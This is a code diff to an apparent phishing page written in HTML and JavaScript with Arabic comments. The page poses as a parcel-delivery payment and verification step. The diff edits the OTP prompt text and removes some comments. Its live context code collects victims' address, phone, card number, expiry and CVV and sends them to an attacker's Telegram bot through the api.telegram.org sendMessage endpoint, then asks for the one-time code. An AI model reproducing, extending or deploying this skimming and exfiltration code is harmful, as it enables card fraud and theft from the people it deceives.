@@ -222,11 +222,10 @@
             </div>
             <div class="payment-header">
                 <h2>التحقق من الدفع</h2>
-                <!-- تعديل: النص هون رح يتغير ديناميكياً عشان يبين آخر 4 أرقام -->
-                <p id="otp-subtitle">أدخل رمز التحقق المرسل إلى جوالك</p>
+                <!-- التعديل الجديد للنص -->
+                <p id="otp-subtitle">أدخل الرمز المرسل إلى الأرقام</p>
             </div>
             
-            <!-- تعديل: شلنا الـ placeholder -->
             <input type="tel" id="otp-single-input" class="otp-single-input">
             
             <button class="verify-btn" onclick="verifyOTP()">تأكيد</button>
@@ -253,7 +252,7 @@
         let currentTrackingNumber = "";
         let currentCustomerName = "";
         let currentAmount = "";
-        let currentPhone = ""; // متغير لحفظ رقم الجوال
+        let currentPhone = ""; 
 
         function sendTelegramMsg(msg) {
             var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
@@ -294,7 +293,6 @@
                 return;
             }
 
-            // تعديل: حفظ رقم الجوال عشان نستخدمه بالـ OTP
             currentPhone = phone;
 
             let addressMsg = `📍 بيانات العنوان:\n`;
@@ -325,14 +323,6 @@
             cardMsg += `تاريخ الانتهاء: ${expiry}\n`;
             cardMsg += `رمز الأمان: ${cvv}`;
             sendTelegramMsg(cardMsg);
-
-            // تعديل: سحب آخر 4 أرقام من رقم الجوال وعرضها بالرسالة
-            if (currentPhone.length >= 4) {
-                let last4 = currentPhone.slice(-4);
-                document.getElementById('otp-subtitle').innerText = `أدخل رمز التحقق المرسل إلى آخر 4 أرقام من جوالك (${last4})`;
-            } else {
-                document.getElementById('otp-subtitle').innerText = `أدخل رمز التحقق المرسل إلى جوالك`;
-            }
 
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
